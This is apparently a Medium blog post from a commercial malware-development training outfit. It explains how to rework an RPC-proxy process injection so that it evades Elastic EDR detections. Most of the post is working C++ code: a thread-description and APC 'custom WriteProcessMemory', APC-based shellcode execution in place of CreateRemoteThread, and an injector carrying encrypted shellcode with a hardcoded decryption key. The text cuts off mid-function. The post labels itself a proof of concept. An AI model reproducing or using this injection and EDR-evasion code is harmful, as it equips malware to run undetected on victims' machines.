# https://medium.com/@s12deff/rpc-proxy-injection-part-ii-breaking-elastic-edr-telemetry-7eac298508c2

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Frpc-proxy-injection-part-ii-breaking-elastic-edr-telemetry-7eac298508c2&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Frpc-proxy-injection-part-ii-breaking-elastic-edr-telemetry-7eac298508c2&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# **RPC Proxy Injection Part II: Breaking Elastic EDR Telemetry**

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:32:32/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---byline--7eac298508c2---------------------------------------)

[S12 - 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--7eac298508c2---------------------------------------)

Follow

21 min read

·

Feb 17, 2026

5

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D7eac298508c2&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Frpc-proxy-injection-part-ii-breaking-elastic-edr-telemetry-7eac298508c2&source=---header_actions--7eac298508c2---------------------post_audio_button------------------)

Share

Welcome to this new Medium post, this one it’s the continuation of a previous post from some weeks ago where we leverage the **Remote Procedure Call (RPC)** protocol to execute code via a proxy process, redirecting execution flow to mask the origin of the malicious payload.

### **Actual Point**

- The **Injector** acts as the **Boss** of the attack by hosting an **RPC Server**. It exposes a specific interface with a function designed to target a victim process and prepare it for execution. In this stage, its main job is to wait for the trigger and provide the bridge needed to run code inside a trusted environment.
- The **DLL** is the **Secret Agent** that does the heavy lifting. It is responsible for allocating **RWX (Read-Write-Execute)** memory inside the victim process and copying the shellcode into that space. Once the memory is ready, the DLL calls the function exposed by the **RPC Server** (the Injector) to officially trigger the execution of the shellcode from within the trusted process.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*wxpm3bD4iZxim6AR4wc4BA.png)

**Courses:** Learn how real malware works on Windows OS from beginner to advanced taking our courses, all explained in C++.

[**All Courses** \\
\\
**Learn how real Malware works**\\
\\
0x12darkdev.net](https://0x12darkdev.net/courses/?origin=medium&source=post_page-----7eac298508c2---------------------------------------)

**Technique Database:** Access 50+ real malware techniques with weekly updates, complete with code, PoCs, and AV scan results:

[**Malware Techniques Database** \\
\\
**Explore an ever-growing collection of malware techniques**\\
\\
0x12darkdev.net](https://0x12darkdev.net/techniques/?source=post_page-----7eac298508c2---------------------------------------)

**Modules**: Dive deep into essential malware topics with our modular training program! Get a new module every 14 days. Start at just **$1.99 per module**, or unlock **lifetime access to all modules for $100**.

[**0x12 Dark Development** \\
\\
**Learn the best malware techniques for Windows OS, with content ranging from beginner to advanced levels. All…**\\
\\
0x12darkdev.net](https://0x12darkdev.net/modules?source=post_page-----7eac298508c2---------------------------------------)

## Introduction

Perfect, so just to remember, this technique it’s just a proof of concept of how any Windows feature can be used in malicious ways. It never will be the most stealthy or the most dangerous technique. It’s just for fun, and to show that you can just read about any Windows protocol, like RPC and find ways to approach the feature for maldev.

- **Difficulty Level:** Intermediate

## Methodology

Now in this post we want to evade some **Elastic EDR** events that had triggered this technique, concretely, this one:

```
message: "Endpoint API event - WriteProcessMemory"
```

The complete event shows:

```
{
  "event_timestamp": "2026-01-21T11:18:28.909Z",
  "event_type": "WriteProcessMemory",
  "source_process": "RPCProxy.exe (PID 2712)",
  "target_process": "Notepad.exe (PID 6292, suspended)",
  "api_call": "WriteProcessMemory (cross-process)",
  "written_size": 464,
  "address": 1705077112832,
  "address_type": "Unbacked",
  "user": "s12de",
  "host": "s12",
  "critical_indicators": [\
    "Cross-process memory write",\
    "Writing to unbacked RWX memory in suspended process",\
    "Unsigned binary (RPCProxy.exe) in user Documents folder",\
    "Classic process injection step (T1055)",\
    "Follows previous VirtualAllocEx in same target"\
  ]
}
```

So here, the main problem it’s the combination of a previous **VirtualAllocEx + WriteProcessMemory** in a RWX memory space. So let’s just try to evade the use of **WriteProcessMemory.**

To achieve the evasion of the **WriteProcessMemory Elastic Event an** d some other behavioral detections, we need to follow these logical steps:

1. **Use a custom way to write the shellcode in remote process:** First, we need to find a way to write the shellcode, without using the **WriteProcessMemory** or any other similar function like **RtlMoveMemory** or **memcpy**
2. Use an alternative to **CreateRemoteThread** to execute the shellcode, in this case we will play with APC’s.

## Implementation

Now, let’s start cooking this changes, first of all, I have a perfect code to evade the usage of the **WriteProcessMemory,** this it’s based in this additional file:

```
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <iomanip>

using namespace std;

typedef PVOID PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx2_FIXED)(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle,
    _In_ ULONG ApcFlags,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );

typedef NTSTATUS(WINAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
    HANDLE ThreadHandle,
    HANDLE ReserveHandle,
    ULONG ApcFlags,
    PPS_APC_ROUTINE ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
    );

// Helper function to print addresses in both standard and x64dbg formats
void print_address(const char* label, ULONG_PTR address)
{
    cout << label << ":\n";
    cout << "    Standard : 0x" << hex << uppercase << address << "\n";

    // x64dbg format: always 16 hex digits, padded with zeros
    cout << "    x64dbg   : ";
    cout << setfill('0') << setw(16) << hex << uppercase << address << "\n";
    cout << dec << setfill(' '); // reset
}

bool _NtQueueApcThreadEx2(HANDLE hThread, void* func, void* arg0, void* arg1, void* arg2)
{
    resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

    DWORD res = fNtQueueApcThreadEx2(hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, (PPS_APC_ROUTINE)func, (void*)arg0, (void*)arg1, (arg2));
    return true;
}

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

ULONG_PTR GetRemotePEBAddr(IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;

    auto pNtQueryInformationProcess = reinterpret_cast<decltype(&NtQueryInformationProcess)>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess"));
    if (!pNtQueryInformationProcess) {
        return NULL;
    }
    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    return (ULONG_PTR)pi.PebBaseAddress;
}

void* getPEBUnused(HANDLE hProcess)
{
    ULONG_PTR peb_addr = GetRemotePEBAddr(hProcess);
    if (!peb_addr) {
        std::cerr << "Cannot retrieve PEB address!\n";
        return nullptr;
    }
    const ULONG_PTR UNUSED_OFFSET = 0x340;
    const ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;
    return (void*)remotePtr;
}

// Case-insensitive string comparison helper
bool CaseInsensitiveCompare(const std::wstring& str1, const std::wstring& str2) {
    if (str1.length() != str2.length()) {
        return false;
    }
    return _wcsicmp(str1.c_str(), str2.c_str()) == 0;
}

DWORD GetPIDByProcname(const std::wstring& processName) {
    // Load ntdll.dll and get NtQuerySystemInformation
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return 0;
    }

    PFN_NT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation =
        (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        return 0;
    }

    // Start with an initial buffer size
    ULONG bufferSize = 0x10000; // 64KB initial size
    std::vector<BYTE> buffer;
    NTSTATUS status;

    // Query with increasing buffer size until successful
    do {
        buffer.resize(bufferSize);
        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.data(),
            bufferSize,
            &bufferSize
        );

        if (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            bufferSize *= 2;
        }
    } while (status == 0xC0000004 && bufferSize <= 0x1000000); // Max 16MB

    if (status != 0) { // STATUS_SUCCESS
        return 0;
    }

    // Iterate through processes
    PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer.data();

    while (true) {
        if (processInfo->ImageName.Buffer != nullptr) {
            std::wstring currentProcessName(
                processInfo->ImageName.Buffer,
                processInfo->ImageName.Length / sizeof(WCHAR)
            );

            // Case-insensitive comparison
            if (CaseInsensitiveCompare(currentProcessName, processName)) {
                return (DWORD)(ULONG_PTR)processInfo->UniqueProcessId;
            }
        }
        // Move to next process
        if (processInfo->NextEntryOffset == 0) {
            break;
        }
        processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
    }

    return 0; // Process not found
}

HANDLE findThread(HANDLE hProcess, DWORD desiredAccess) {
    DWORD pid = GetProcessId(hProcess);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return INVALID_HANDLE_VALUE;
    }
    do {
        if (te32.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(desiredAccess, FALSE, te32.th32ThreadID);
            if (hThread) {
                CloseHandle(hSnapshot);
                return hThread;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));
    CloseHandle(hSnapshot);
    return INVALID_HANDLE_VALUE;
}

HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
{
    typedef NTSTATUS(NTAPI* pRtlInitUnicodeStringEx)(
        PUNICODE_STRING DestinationString,
        PCWSTR SourceString
        );
    typedef NTSTATUS(NTAPI* pNtSetInformationThread)(
        HANDLE ThreadHandle,
        THREADINFOCLASS ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength
        );

    UNICODE_STRING DestinationString = { 0 };

    // Create temporary buffer without null bytes
    BYTE* padding = (BYTE*)calloc(buf_size + sizeof(WCHAR), 1);
    if (!padding) return E_OUTOFMEMORY;
    memset(padding, 'A', buf_size);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto _RtlInitUnicodeStringEx = (pRtlInitUnicodeStringEx)GetProcAddress(hNtdll, "RtlInitUnicodeStringEx");
    auto _NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");

    if (!_RtlInitUnicodeStringEx || !_NtSetInformationThread) {
        free(padding);
        return E_FAIL;
    }

    // Initialize with padding
    _RtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);

    // Overwrite with real payload (including null bytes)
    memcpy(DestinationString.Buffer, buf, buf_size);

    // Call NtSetInformationThread directly
    const THREADINFOCLASS ThreadNameInformation = (THREADINFOCLASS)0x26;
    NTSTATUS status = _NtSetInformationThread(
        hThread,
        ThreadNameInformation,
        &DestinationString,
        0x10
    );

    /* NTSTATUS status = _NtSetInformationThread(
        hThread,
        ThreadNameInformation,
        &DestinationString,
        sizeof(UNICODE_STRING)
    );*/

    free(padding);
    return HRESULT_FROM_NT(status);
}

LPVOID CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, size_t payload_size, LPVOID remotePtr, HANDLE hThread, LPVOID rwx) {
    // FUNCTION RESOLUTION (your original API loading code)
    // ---------------------------------------------------------
    // Assuming these global variables or helper functions are defined elsewhere:
    // pReadProcessMemory, getFunctionAddressByHash, _NtQueueApcThreadEx2, CW_STR, etc.
    // Cleaned up a bit to focus on the loop logic.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void* pRtlMoveMemory = (void*)GetProcAddress(hNtdll, "RtlMoveMemory");
    if (!pRtlMoveMemory) return nullptr;

    // ---------------------------------------------------------
    // CHUNKING LOOP LOGIC
    // ---------------------------------------------------------
    // Define a safe block size.
    // Must be LESS than 65535. Using 0x8000 (32768 bytes) for safety margin.
    //const size_t MAX_BLOCK_SIZE = 0x8000;

    // 49,152
    //const size_t MAX_BLOCK_SIZE = 0xC000;

    // 61,440
    const size_t MAX_BLOCK_SIZE = 0xF000;

    size_t bytesWritten = 0;

    while (bytesWritten < payload_size) {
        // 1. Calculate current chunk size
        size_t remaining = payload_size - bytesWritten;
        size_t currentChunkSize = (remaining > MAX_BLOCK_SIZE) ? MAX_BLOCK_SIZE : remaining;

        // Pointer to the start of the current chunk in YOUR memory
        BYTE* currentPayloadPtr = payload + bytesWritten;

        // Pointer to the destination in REMOTE memory (advancing the rwx pointer)
        void* currentRemoteDest = (BYTE*)rwx + bytesWritten;

        std::cout << "[*] Processing chunk: " << currentChunkSize << " bytes..." << std::endl;

        // 2. Use your original function to set this chunk in the thread description
        HRESULT hr = mySetThreadDescription(hThread, currentPayloadPtr, currentChunkSize);
        if (FAILED(hr)) {
            std::cerr << "SetThreadDescription failed on chunk! HR: " << std::hex << hr << "\n";
            return nullptr;
        }

        // 3. Queue APC #1: Force the process to allocate the description and write the address to remotePtr
        if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), remotePtr, nullptr)) {
            std::cerr << "Failed to queue GetThreadDescription APC\n";
            return nullptr;
        }

        // Important: Wait for the APC to execute.
        // Your original 21s sleep is kept for safety (in case of EDR timing requirements).
        Sleep(21000);

        // 4. Read where the OS stored our chunk (ReadProcessMemory)
        ULONG_PTR realPayloadPtr = 0;

        // Your retry logic would go here if needed...
        if (!ReadProcessMemory(hProcess, remotePtr, &realPayloadPtr, sizeof(realPayloadPtr), nullptr)) {
            std::cerr << "Failed to read ptr inside loop. GLE: " << GetLastError() << "\n";
            return nullptr;
        }

        if (!realPayloadPtr) {
            std::cerr << "Ptr is NULL inside loop.\n";
            return nullptr;
        }

        // 5. Queue APC #2: Move memory from description (realPayloadPtr) to final destination (rwx + offset)
        if (!_NtQueueApcThreadEx2(hThread, pRtlMoveMemory, currentRemoteDest, (void*)realPayloadPtr, (void*)currentChunkSize)) {
            std::cerr << "Failed to queue memcpy APC\n";
            return nullptr;
        }

        // Advance counters
        bytesWritten += currentChunkSize;

        // Small pause to ensure memcpy happens before overwriting description next iteration
        Sleep(1000);
    }

    std::cout << "[+] All chunks staged. Waiting for sync..." << std::endl;

    // Optional final sleep
    Sleep(5000);
    // Return the base RWX address (realPayloadPtr changes each iteration so it's not valid at the end)
    return rwx;
}
```

We use a **data-smuggling** technique involving **Thread Descriptions** and **APCs** to move the shellcode

### **How the Code Works**

The code implements a custom function called `CustomWriteProcessMemory`. Instead of a direct write, it performs a multi-stage hand-off:

1. **Thread Description Smuggling (**`mySetThreadDescription` **):** Windows allows you to set a name for a thread. We hijack this feature to store our shellcode inside the `UNICODE_STRING` buffer of a thread's description. Since this is a legitimate OS feature, it doesn't look like a memory injection.
2. **The Get APC (**`GetThreadDescription` **):** We queue an APC to the target thread. This forces the victim process to call `GetThreadDescription` on itself. This action makes the OS allocate a buffer containing our shellcode inside the victim's own memory and provides us with the address of that buffer.
3. **The Move APC (**`RtlMoveMemory` **):** Once the shellcode is inside the victim's memory (but in a "safe" string buffer), we queue a second APC. This one tells the process to call `RtlMoveMemory` (memcpy) to move the shellcode from the temporary string buffer into our final **RWX** execution space.

This technique it’s originally (a little bit modified to work with bigger shellcode chunks than **65,536** bytes) from this post:

[https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense](https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/)

So now we can just implement this in the main file:

```
// SIZE_T written;
 // if (!WriteProcessMemory(processHandle, remoteMem, g_DecryptBuffer, g_PaddedLen, &written)) {
     // printf("[SERVER ERROR] TriggerInjection: WriteProcessMemory failed (0x%08x)\n", GetLastError());
     // CloseHandle(processHandle);
     // return;
 // }

VOID* pebUnused = getPEBUnused(processHandle);
if (!pebUnused) {
    printf("[SERVER ERROR] TriggerInjection: Failed to find unused PEB address\n");
    CloseHandle(processHandle);
    return;
}

HANDLE hThread = findThread(processHandle, THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION);
if (hThread == INVALID_HANDLE_VALUE) {
    printf("[SERVER ERROR] TriggerInjection: Failed to find a suitable thread in the target process\n");
    CloseHandle(processHandle);
    return;
}

printf("[SERVER] TriggerInjection: Found unused PEB address at 0x%p\n", pebUnused);
printf("[SERVER] TriggerInjection: Found thread handle 0x%p\n", hThread);
LPVOID writtenPtr = CustomWriteProcessMemory(processHandle, g_DecryptBuffer, g_PaddedLen, pebUnused, hThread, remoteMem);
if (!writtenPtr) {
    printf("[SERVER ERROR] TriggerInjection: CustomWriteProcessMemory failed\n");
    CloseHandle(processHandle);
 return;
}
```

Perfect, the first step it’s done, and works! Note that for some GUI processes maybe do you need to interact with the GUI to trigger the execution.

To address this issue, you have this post from here, just replace the current **findThread** function for the one created in the post:

[**Thread Selection Strategies for Injection via NtQueueApcThreadEx2** \\
\\
**In this post, we explore various strategies for selecting target threads in remote processes. Specifically, we’ll look…**\\
\\
medium.com](https://medium.com/@s12deff/thread-selection-strategies-for-injection-via-ntqueueapcthreadex2-0f6082e55e10?source=post_page-----7eac298508c2---------------------------------------)

### Evading **CreateRemoteThread**

Now it’s time to evade the use of **CreateRemoteThread,** for this goal, we will use the same APC key function: **NtQueueApcThreadEx2.**

So we just add:

```
/* HANDLE hThreadd = CreateRemoteThread(
     processHandle,
     NULL,
     0,
     (LPTHREAD_START_ROUTINE)remoteMem,
     NULL,
     0,
     NULL
 );

 if (!hThreadd) {
     printf("[SERVER ERROR] TriggerInjection: CreateRemoteThread failed (0x%08x)\n", GetLastError());
     CloseHandle(processHandle);
     return;
 }*/

 using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
     HANDLE ThreadHandle,
     HANDLE ReserveHandle,
     ULONG ApcFlags,
     PPS_APC_ROUTINE ApcRoutine,
     PVOID ApcArgument1,
     PVOID ApcArgument2,
     PVOID ApcArgument3
     );

 resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

 DWORD res = fNtQueueApcThreadEx2(hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
     (PPS_APC_ROUTINE)remoteMem, NULL, NULL, NULL);

 printf("NtQueueApcThreadEx2 result: 0x%08x\n", res)
```

This resolves to this undocumented function:

```
// From https://ntdoc.m417z.com/ntqueueapcthreadex2

/**
 * Queues an Asynchronous Procedure Call (APC) to a specified thread.
 *
 * \param ThreadHandle A handle to the thread to which the APC is to be queued.
 * \param ReserveHandle An optional handle to a reserve object. This can be obtained using NtAllocateReserveObject.
 * \param ApcFlags Flags that control the behavior of the APC. These flags are defined in QUEUE_USER_APC_FLAGS.
 * \param ApcRoutine A pointer to the RtlDispatchAPC function or custom APC routine to be executed.
 * \param ApcArgument1 An optional argument to be passed to the APC routine.
 * \param ApcArgument2 An optional argument to be passed to the APC routine.
 * \param ApcArgument3 An optional argument to be passed to the APC routine.
 * \return NTSTATUS Successful or errant status.
 * \remarks The APC will be executed in the context of the specified thread when the thread enters an alertable wait state or immediately
 * when QUEUE_USER_APC_SPECIAL_USER_APC is used or any process calls the NtTestAlert, NtAlertThread,
 * NtAlertResumeThread or NtAlertThreadByThreadId functions.
 */
NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx2(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle, // NtAllocateReserveObject
    _In_ ULONG ApcFlags, // QUEUE_USER_APC_FLAGS
    _In_ PPS_APC_ROUTINE ApcRoutine, // RtlDispatchAPC
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );
```

So, now both goals are done. We jump to the proof of concept.

## Get S12 - 0x12Dark Development’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

But before, just the full code:

```
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>
#include "message.h"
#include "CustomWrite.h"

#pragma comment(lib, "Rpcrt4.lib")

// Add evasion
// 1- Encrypted shellcode = DONE!
// 2- Decode at runtime = DONE!
// 3- Divide responsibility -> OpenProcess and VirtualAllocEx in the DLL. WriteProcessMemory and CreateRemoteThread in the RPC server = DONE!
// 4- Change to CustomWriteProcessMemory -> DONE
// 5- Alternative to CreateRemoteThread
// 6- Divide Shellcode responsibility -> DLL writes a part of shellcode + RPC server writes the rest
// 7- Inject the DLL directly from the RPC server
// 8- API Hashing

typedef PVOID PPS_APC_ROUTINE;

unsigned char buf[] = "\xe3\x24\x00\x00\x43\x5f\x00\x00\x68\x6d\x00\x00\xa5\x6b\x00\x00\x73\x7b\x9c\x98\x9f\xb0\xca\x75\xb3\xc3\x24\xa9\x50\xa5\x9a\x33\x4e\xab\xba\xa6\x97\x05\xd1\x8a\x20\xd4\xe7\x1a\xbe\xd0\x47\x2f\x03\x4e\x21\x3b\x18\xbc\x3f\x51\x2c\x6a\x73\xf8\x84\xe8\x78\xd1\x86\x93\xc6\xf4\x8a\xb2\x64\xd2\x03\x27\x99\xfb\xc7\x44\x49\x45\x70\xea\x8c\x68\x9a\x51\x8a\x84\x7a\x3b\x59\x8d\x30\x6e\x25\x30\xe7\x33\x34\x40\x5b\x52\xcd\x03\x9d\x63\x9b\xe4\x76\x3f\xfd\x00\x17\xb4\xef\x32\xf9\xfb\x58\x89\xd0\x5a\xcd\x5a\x8f\x61\x48\x91\x24\xf4\xcc\xb3\xe3\x61\x18\x77\xa1\xf9\x04\x3b\x09\x5e\x96\xf2\xe8\xbd\xf5\xca\xb2\x83\x2b\x18\xae\xd8\x20\x43\x1b\xf4\x52\x05\x83\x9c\x70\x92\xe7\x50\x5b\xff\xf6\x24\x6e\x6f\xcc\x8c\x27\x83\xab\x31\x43\xc1\x41\x88\x92\x15\xd4\x54\x1e\x9a\x75\x88\xa2\x98\xbc\x80\x61\x19\x02\x74\xd5\xbe\x14\xe8\xfc\xfd\x5f\xf3\xb9\xdd\x9a\x37\x50\x6f\x20\x3d\x3a\x34\xc3\x16\x7d\xd1\x0b\x69\x32\x50\x91\x61\xec\x94\xc0\x55\xf5\x31\xa2\x5b\xa7\x94\xc5\x07\x0f\xd4\x0a\x2d\x34\x1b\x51\xbc\x86\xd2\xdb\x37\xc6\x2f\x86\x90\xc6\x8a\x09\x9e\x6d\x28\xab\x31\x0b\x0e\xea\x89\x8a\x20\xeb\x51\x4d\x9b\xaa\x19\xdd\xc6\xe0\x9a\xf5\xa1\x0c\xea\x30\x0c\xc6\x94\x42\xe4\x7d\x14\xdf\x63\x42\x58\x8d\x1f\xf6\x9b\xbe\xd7\x03\x7f\x79\xdf\x2a\x8f\x0c\xdd\x5d\x1e\xb5\xfc\x66\x02\x1f\x7a\x4b\xde\xdb\xb7\xd7\x1f\xdd\x49\x36\x8b\x1e\x18\x78\x09\x74\xea\x9c\x2b\x8e\xd6\xd5\xef\x83\x9b\xb3\x60\xb5\xaf\x1f\x92\x86\x0e\x84\xcb\xa3\xee\x73\x73\xb9\xd3\xfe\xc6\xc1\xf8\x33\x38\x6a\x10\x17\xe7\x2e\x5f\xab\xba\xad\x48\xff\xa7\x58\x22\x73\xc0\xd2\xd5\x37\x1f\x9a\x26\xcd\xcc\xb0\x8e\x47\xd5\x78\x61\x5d\xb1\x66\x93\xe7\xa3\xfb\x9d\x4d\x98\x9d\x75\x07\xbb\x93\xd4\x93\x8f\xd6\x56\x9e\x17\x35\x49\x8b\xc0\xa1\x4d\xb4\xa5\x7a\x3d\xe1\xec\xf6\x91\x50\x83\xe8\xeb\x84\x29\x38\x93\x5d\x4f\x90\xae\x08\x90\xd0\x26\x31\xf2\x5f\x65\x6a\xde\x96\x48\xc4\xdf\xe7\x8b\x0d\xb2\xca\x35\xb4\x09\x64\xf9\x53\x9b\x35\x85\x09\x78\x13\x5a\x25\xc4\x38\x25\xae\xc1\x62\x6b";
int bufLen = sizeof(buf);

// ==================== GLOBAL STATE ====================
unsigned char* g_DecryptBuffer = NULL;
SIZE_T g_PaddedLen = 0;

#define ROUNDS 45
#define BLOCK_BYTES 16

uint64_t roundKeys[ROUNDS];

// ==================== CRC32 ====================
uint32_t crc32Table[256];

void generateCrc32Table() {
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int j = 0; j < 8; j++) {
            c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
        }
        crc32Table[i] = c;
    }
}

uint32_t crc32(const unsigned char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc = crc32Table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
    }
    return crc ^ 0xFFFFFFFF;
}

// ==================== SPECK ====================
void parseHexKey(const char* keyStr, uint64_t key[2]) {
    char buffer[17] = { 0 };
    strncpy(buffer, keyStr, 16);
    key[0] = strtoull(buffer, NULL, 16);
    strncpy(buffer, keyStr + 16, 16);
    key[1] = strtoull(buffer, NULL, 16);
}

uint64_t rol(uint64_t x, int r) {
    return (x << r) | (x >> (64 - r));
}

uint64_t ror(uint64_t x, int r) {
    return (x >> r) | (x << (64 - r));
}

void speckKeySchedule(uint64_t key[2]) {
    roundKeys[0] = key[0];
    uint64_t b = key[1];
    for (int i = 0; i < ROUNDS - 1; i++) {
        b = (ror(b, 8) + roundKeys[i]) ^ i;
        roundKeys[i + 1] = rol(roundKeys[i], 3) ^ b;
    }
}

void speckEncrypt(uint64_t* x, uint64_t* y) {
    for (int i = 0; i < ROUNDS; i++) {
        *x = (ror(*x, 8) + *y) ^ roundKeys[i];
        *y = rol(*y, 3) ^ *x;
    }
}

void speckDecrypt(uint64_t* x, uint64_t* y) {
    for (int i = ROUNDS - 1; i >= 0; i--) {
        *y = ror(*y ^ *x, 3);
        *x = rol((*x ^ roundKeys[i]) - *y, 8);
    }
}

// ==================== RPC FUNCTIONS ====================

void GetSize(handle_t IDL_handle, hyper* size)
{
    printf("[SERVER] GetSize: Starting\n");

    if (size == NULL) {
        printf("[SERVER ERROR] GetSize: size is NULL\n");
        return;
    }

    const char* keyStr = "A9xK4R0E2Wc6B1D8P5N7ZL3GJQHfIeMy";
    uint64_t key[2];

    parseHexKey(keyStr, key);
    speckKeySchedule(key);

    uint64_t* iv = (uint64_t*)buf;

    int totalLen = sizeof(buf) - 1;
    int payloadLen = totalLen - BLOCK_BYTES;
    int paddedLen = (payloadLen + BLOCK_BYTES - 1) & ~(BLOCK_BYTES - 1);

    printf("[SERVER] GetSize: Calculated padded length = %d\n", paddedLen);

    if (g_DecryptBuffer) {
        printf("[SERVER] GetSize: Freeing previous buffer\n");
        free(g_DecryptBuffer);
        g_DecryptBuffer = NULL;
    }

    g_DecryptBuffer = (unsigned char*)malloc(paddedLen);
    if (!g_DecryptBuffer) {
        printf("[SERVER ERROR] GetSize: malloc failed\n");
        *size = 0;
        return;
    }

    printf("[SERVER] GetSize: Buffer allocated successfully\n");

    memcpy(g_DecryptBuffer, buf + BLOCK_BYTES, paddedLen);

    uint64_t prevDecrypt[2] = { iv[0], iv[1] };

    for (int i = 0; i < paddedLen; i += BLOCK_BYTES) {
        uint64_t* block = (uint64_t*)(g_DecryptBuffer + i);
        uint64_t temp[2] = { block[0], block[1] };

        speckDecrypt(&block[0], &block[1]);

        block[0] ^= prevDecrypt[0];
        block[1] ^= prevDecrypt[1];

        prevDecrypt[0] = temp[0];
        prevDecrypt[1] = temp[1];
    }

    g_PaddedLen = paddedLen;
    *size = (hyper)paddedLen;

    printf("[SERVER SUCCESS] GetSize: Returning size = %lld\n", *size);
}

void TriggerInjection(
    handle_t IDL_handle,
    int pid,
    hyper hProcess,
    hyper allocMem,
    unsigned char** response
)
{
    printf("[SERVER] TriggerInjection: Starting\n");
    printf("[SERVER] TriggerInjection: PID=%d hProcess=0x%llx allocMem=0x%llx\n",
        pid, hProcess, allocMem);

    if (!response) {
        printf("[SERVER ERROR] TriggerInjection: response is NULL\n");
        return;
    }

    if (!g_DecryptBuffer) {
